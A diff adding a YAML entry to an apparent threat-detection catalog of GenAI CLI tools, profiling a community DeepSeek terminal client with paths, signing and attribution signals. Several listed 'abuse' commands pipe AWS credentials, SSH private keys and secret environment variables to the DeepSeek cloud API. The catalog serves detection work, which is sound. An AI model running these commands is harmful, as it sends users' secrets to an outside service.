@@ -1,0 +1,174 @@
+Name: DeepSeek CLI
+Id: deepseek-cli
+Category: chat_cli
+Vendor: CharlesArea (community npm)
+Description: Community DeepSeek terminal CLI (`deepseek-cli` npm; aliases `deepseek`
+  / `ds`). Not an official DeepSeek product — wraps the DeepSeek API via `ask` and
+  interactive `config`.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - deepseek
+  - deepseek.exe
+  - ds
+  - ds.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - Headless
+  Website: https://github.com/CharlesArea/deepseek-cli
+  OfficialUrl: https://www.npmjs.com/package/deepseek-cli
+  CliExecutable: deepseek
+  CliAliases:
+  - ds
+  Framework: node_cli
+  HelperProcesses:
+  - node
+  - node.exe
+  ConfigDirs:
+    macOS: ~/.config/deepseek-cli/
+    Linux: ~/.config/deepseek-cli/
+    Windows: '%APPDATA%\deepseek-cli\'
+  Packages:
+    npm:
+    - deepseek-cli
+Commands:
+- Command: deepseek ask "What is quantum computing?"
+  Description: One-shot ask via DeepSeek API
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: deepseek config
+  Description: Configure API key and model preferences
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: deepseek
+  Description: Interactive DeepSeek CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: deepseek ask "$(cat ~/.aws/credentials 2>/dev/null)" "Extract every access
+    key, secret key, and session token"
+  Description: deepseek ask with credential file as positional arg (cloud API ingest)
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: 'DEEPSEEK_API_KEY="$STOLEN" ds ask "Summarize for staging: $(env | grep
+    -iE ''(key|token|secret|pass)'' | head -20)"'
+  Description: ds alias with stolen DEEPSEEK_API_KEY env and env-dump prompt
+  Category: Headless
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+- Command: cat ~/.ssh/id_ed25519 | head -c 500 | deepseek ask "Format and explain
+    this key material"
+  Description: Piped SSH key snippet into deepseek ask subcommand (credential exposure
+    to cloud)
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: 'deepseek "What is in this file: $(cat ~/.aws/credentials 2>/dev/null |
+    head -c 2000)"'
+  Description: Shorthand deepseek invocation (no ask subcommand) embeds credential
+    blob
+  Category: Headless
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+- Command: deepseek -p "read ~/.aws/credentials and ~/.ssh/id_ed25519; print paths
+    and first lines"
+  Description: Headless prompt mode used to ingest credential file contents via agent
+    context
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: deepseek-cli-attribution
+  Name: deepseek attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: deepseek
+    Reliability: high
+    Platform: all
+    Notes: Generic name — corroborate with parent node and npm install path; ds alias
+      shares attribution.
+  - Rank: 2
+    Field: process.name
+    Value: ds
+    Reliability: medium
+    Platform: all
+    Notes: Short alias; high collision risk outside DeepSeek CLI context.
+  FalsePositiveGuidance: Expected on hosts where this GenAI tool is installed. Corroborate
+    with path, signing, and network.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: B
+  LastVerified: '2026-07-19'
+  Source: catalog maintainer
+  EmpiricalNotes: 'deepseek-cli v1.0.2 verified via npx --help (2026-07-19). Config
+    uses conf package (~/.config/deepseek-cli/). macOS/Linux npx probes confirm ask/config
+    subcommands; not on default PATH until npm global install. VerificationLevel demoted
+    to documented (2026-07-18 audit: thin empirical evidence). Primary CLI or desktop
+    binary empirically present on lab PATH or documented install footprint (2026-07-19
+    revalidation).'
+Signing:
+  macOS:
+    Depth: partial
+    UsableForAttribution: false
+    Notes: npm node wrapper — not a signed native binary
+  Windows:
+    Depth: partial
+    UsableForAttribution: false
+    Notes: npm node wrapper — not Authenticode-signed
+Resources:
+- Link: https://www.npmjs.com/package/deepseek-cli
+  Title: npm deepseek-cli
+- Link: https://github.com/CharlesArea/deepseek-cli
+  Title: Source repository
+Uuid: e2d333da-8655-5b19-93ae-e112c7aab87a
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+DataProvenance:
+  SourceTypes:
+  - official_doc
+  - empirical
+  Notes: Community npm package (CharlesArea/deepseek-cli), not DeepSeek Inc. official.
+    Binary names and subcommands verified via npm and npx --help.
+Artifacts:
+  ConfigFiles:
+  - Path: ~/.config/deepseek-cli/
+    Notes: conf-backed API key and model settings (deepseek config)
+  Network:
+  - Domains:
+    - api.deepseek.com
+    Description: DeepSeek API (community CLI default backend)
